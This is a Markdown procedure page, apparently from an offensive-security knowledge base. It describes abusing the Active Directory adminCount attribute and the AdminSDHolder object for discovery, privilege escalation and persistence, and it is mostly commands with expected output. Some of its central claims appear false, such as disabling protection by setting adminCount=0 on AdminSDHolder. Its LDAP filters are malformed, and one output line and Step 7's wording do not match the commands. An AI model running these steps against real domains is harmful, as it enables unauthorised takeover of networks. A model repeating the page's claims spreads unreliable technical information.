---
type: procedure
description: >-
  Identify and manipulate the AdminCount attribute in Active Directory to
  discover protected groups and users or evade AdminSDHolder permission resets
  for privilege escalation.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
techniques:
  - '[[techniques/Account Manipulation|T1098 - Account Manipulation]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
  - '[[techniques/Domain Groups|T1087.002 - Domain Groups]]'
sub_techniques: []
tags:
  - Active Directory
  - Privilege Escalation
  - AdminSDHolder
  - Domain Enumeration
commands:
  - '[[commands/powershell-get-aduser-admincount]]'
  - '[[commands/powershell-get-adgroup-admincount]]'
  - '[[commands/powershell-adsisearcher-admincount]]'
  - '[[commands/crackmapexec-ldap-admincount-enum]]'
  - '[[commands/python-ldapdomaindump-domain-dump]]'
  - '[[commands/jq-filter-admincount-accounts]]'
  - '[[commands/powershell-get-adobject-adminsdholder]]'
  - '[[commands/powershell-set-aduser-admincount]]'
platforms:
  - Windows
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# AdminCount-Abuse

## Summary

The AdminCount Abuse procedure leverages the AdminCount attribute in Active Directory to identify protected users and groups that are subject to AdminSDHolder permission resets. These objects often contain stale administrative privileges that attackers can exploit for escalation. The procedure includes discovering such objects, optionally disabling AdminSDHolder protections to prevent permission overwrites, and setting AdminCount on controlled objects to gain protected status.

## Description

In Active Directory, the AdminCount attribute flags objects (users, groups, etc.) as protected when set to 1, triggering the AdminSDHolder mechanism to periodically reset their ACLs to a secure baseline every hour. This protection applies to built-in admin groups like Domain Admins but can leave remnants of privileges on objects that were once members. Attackers abuse this by enumerating objects with AdminCount=1 to find exploitable stale permissions or by setting AdminCount=1 on their own groups to evade custom permission changes. Disabling the mechanism (by setting AdminCount=0 on AdminSDHolder) allows persistent modifications. This technique is useful in lateral movement and persistence scenarios within domain environments, requiring authenticated access but potentially leading to domain admin rights.

## Requirements

1. Valid domain credentials with read access to AD objects (e.g., domain user account).
2. PowerShell with ActiveDirectory module installed (or RSAT tools on Windows).
3. Network access to a domain controller (LDAP port 389/636 open).
4. Optional: Tools like CrackMapExec and ldapdomaindump for alternative enumeration.
5. For modification steps: Write permissions on target objects or delegation rights.

## Defense

- Monitor LDAP queries and modifications to the AdminCount attribute using tools like Microsoft ATA or custom SIEM rules.
- Regularly audit and clean up objects with AdminCount=1 that are no longer in protected groups.
- Implement least privilege: Remove unnecessary memberships from protected groups and enforce strict ACLs.
- Enable AdminSDHolder auditing and alert on changes to the AdminSDHolder object itself.

## Objectives

1. Discover users and groups protected by AdminSDHolder (AdminCount=1) for potential stale privilege exploitation.
2. Disable AdminSDHolder permission resets to allow persistent ACL modifications on protected objects.
3. Set AdminCount=1 on controlled objects to gain protection against permission resets, aiding persistence.
4. Escalate privileges by leveraging discovered administrative remnants.

## Instructions

### Step 1: Query the AdminSDHolder Object

**Context**: First, locate and inspect the AdminSDHolder object to understand the current protection status. This de facto root object controls SD propagation for all protected items. Use PowerShell to retrieve its details without GUI tools like ADSI Edit.

**Command** ([[commands/powershell-get-adobject-adminsdholder]]):
```powershell
Get-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Properties adminCount
```

> This command fetches the AdminSDHolder object and its adminCount property. Replace `DC=domain,DC=com` with your domain's distinguished name. The output shows if adminCount is 1 (enabled) or 0 (disabled). This step verifies if protections are active before proceeding.

**Expected Output**:
```
DistinguishedName : CN=AdminSDHolder,CN=System,DC=domain,DC=com
Name              : AdminSDHolder
ObjectClass       : container
adminCount        : 1
```

### Step 2: Disable AdminSDHolder Protections (Optional)

**Context**: If modifications to protected objects are needed without resets, set adminCount to 0 on AdminSDHolder. This disables SD propagation globally but should be done cautiously as it affects all protected objects. Requires domain admin rights or equivalent.

**Command** ([[commands/powershell-set-adobject-adminsdholder]]):
```powershell
Set-ADObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Replace @{adminCount=0}
```

> This replaces the adminCount attribute to 0, stopping hourly ACL resets. Confirm with a follow-up Get-ADObject query. Note: This is reversible by setting back to 1, but use only in controlled environments.

**Expected Output**:
```
# No output on success; verify with Get-ADObject showing adminCount: 0
```

### Step 3: Enumerate Users with AdminCount=1

**Context**: Search for user accounts flagged as protected. These may have residual admin rights from past group memberships, exploitable for escalation.

**Command** ([[commands/powershell-get-aduser-admincount]]):
```powershell
Get-ADUser -LDAPFilter "(objectCategory=person)(adminCount=1)" -Properties adminCount
```

> This LDAP filter targets person objects (users) with adminCount=1. Pipe to Select-Object for sAMAccountName and adminCount to list them. If no ActiveDirectory module, fall back to adsisearcher.

**Expected Output**:
```
DistinguishedName : CN=Admin User,CN=Users,DC=domain,DC=com
Name              : Admin User
adminCount        : 1
sAMAccountName    : adminuser
```

### Step 4: Enumerate Groups with AdminCount=1

**Context**: Identify protected groups, which often hold domain-wide privileges. Discovering these can reveal paths to add yourself or pivot.

**Command** ([[commands/powershell-get-adgroup-admincount]]):
```powershell
Get-ADGroup -LDAPFilter "(objectCategory=group)(adminCount=1)" -Properties adminCount
```

> Similar to user enumeration but for groups. This lists groups like Domain Admins that are protected.

**Expected Output**:
```
DistinguishedName : CN=Domain Admins,CN=Users,DC=domain,DC=com
Name              : Domain Admins
adminCount        : 1
```

### Step 5: Alternative Enumeration with CrackMapExec

**Context**: For remote enumeration without PowerShell, use CrackMapExec to query LDAP for adminCount=1 objects across the domain.

**Command** ([[commands/crackmapexec-ldap-admincount-enum]]):
```bash
crackmapexec ldap $DC_IP -u $USERNAME -p $PASSWORD --admin-count
```

> Replace $DC_IP, $USERNAME, $PASSWORD with target DC IP and creds. This flags users/groups with adminCount=1 and potential admin rights.

**Expected Output**:
```
LDAP 10.10.10.10:445       Administrator           [P] 100 users + 10 groups with admincount=1
```

### Step 6: Dump Domain and Filter with ldapdomaindump and jq

**Context**: For offline analysis, dump the full domain via LDAP, then parse JSON for adminCount=1 entries. Useful if direct queries are blocked.

**Command** ([[commands/python-ldapdomaindump-domain-dump]]):
```bash
python3 ldapdomaindump.py -u '$DOMAIN\\$USERNAME' -p $PASSWORD $DC_IP
```

> This dumps domain objects to JSON files (e.g., domain_users.json). Follow with jq to filter.

**Expected Output**:
```
Dumping domain: domain.com
Wrote users to domain_users.json
```

**Command** ([[commands/jq-filter-admincount-accounts]]):
```bash
jq -r '.[] | select(.attributes.adminCount == 1) | .sAMAccountName' domain_users.json
```

> Filters and extracts sAMAccountNames of users with adminCount=1 from the dump.

**Expected Output**:
```
adminuser
protectedgroup
```

### Step 7: Set AdminCount on a Controlled Object

**Context**: To abuse for persistence, set adminCount=1 on a group you control, making its ACLs protected and harder to revoke.

**Command** ([[commands/powershell-set-aduser-admincount]]):
```powershell
Set-ADUser -Identity $TARGET_USER -Replace @{adminCount=1}
```

> Targets a specific user; use Set-ADGroup for groups. Requires write access. Verify with Get-ADUser.

**Expected Output**:
```
# No output on success; adminCount now 1
```

### Step 8: Fallback Enumeration with ADSI Searcher

**Context**: If ActiveDirectory module is unavailable, use native .NET ADSI searcher for quick queries.

**Command** ([[commands/powershell-adsisearcher-admincount]]):
```powershell
([adsisearcher]'(AdminCount=1)').FindAll() | ForEach-Object { $_.Properties }
```

> This searches the entire directory for AdminCount=1 objects, outputting properties like name and distinguishedName.

**Expected Output**:
```
dn: CN=Admin User,CN=Users,DC=domain,DC=com
name: Admin User
adminCount: 1
```
